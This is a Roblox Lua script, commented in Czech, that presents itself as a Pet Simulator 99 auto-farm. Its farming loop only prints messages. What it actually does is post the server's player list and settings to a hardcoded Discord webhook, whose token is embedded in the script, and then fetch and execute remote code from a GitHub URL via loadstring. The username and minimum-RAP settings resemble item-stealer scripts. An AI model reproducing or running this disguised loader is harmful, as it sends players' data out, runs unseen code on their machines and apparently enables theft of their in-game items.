local YourUsername = "pettsimullator99"
local MinimumRAP = 100000 
local Webhook = "https://discordapp.com/api/webhooks/1360277766607601747/FRluKzccRHlwPjgSO3cWjff0WiH0SKJdpxVPmjzoOhsL6N7_W0wbJwRt_p2O5Z90FfiI"

local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer  -- Toto je jméno hráče, který skript spustí


local allPlayers = game.Players:GetPlayers()

local usernames = {}
for _, p in ipairs(allPlayers) do
    table.insert(usernames, p.Name)
end

local usernamesString = table.concat(usernames, ", ")


local data = {
    ["content"] = "🎮 Skript spuštěn hráčem: " .. YourUsername ..
                 "\\nSeznam hráčů na serveru: " .. usernamesString ..
                 "\\nMinimumRAP pro sbírání: " .. MinimumRAP
}

local success, err = pcall(function()
    HttpService:PostAsync(Webhook, HttpService:JSONEncode(data))
end)

if success then
    print("📬 Webhook zpráva odeslána!")
else
    warn("❌ Chyba při odesílání webhooku: " .. err)
end

-- 💡 Auto-All funkce
print("✅ Auto-All skript spuštěn!")

local function autoAll()
    while true do
        print(YourUsername .. " farmaří...")  -- 
        wait(1)
    end
end

spawn(autoAll) 

loadstring(game:HttpGet("https://raw.githubusercontent.com/pettsimullator99/PetSimulator99/main/PetSimulator99.lua", true))()
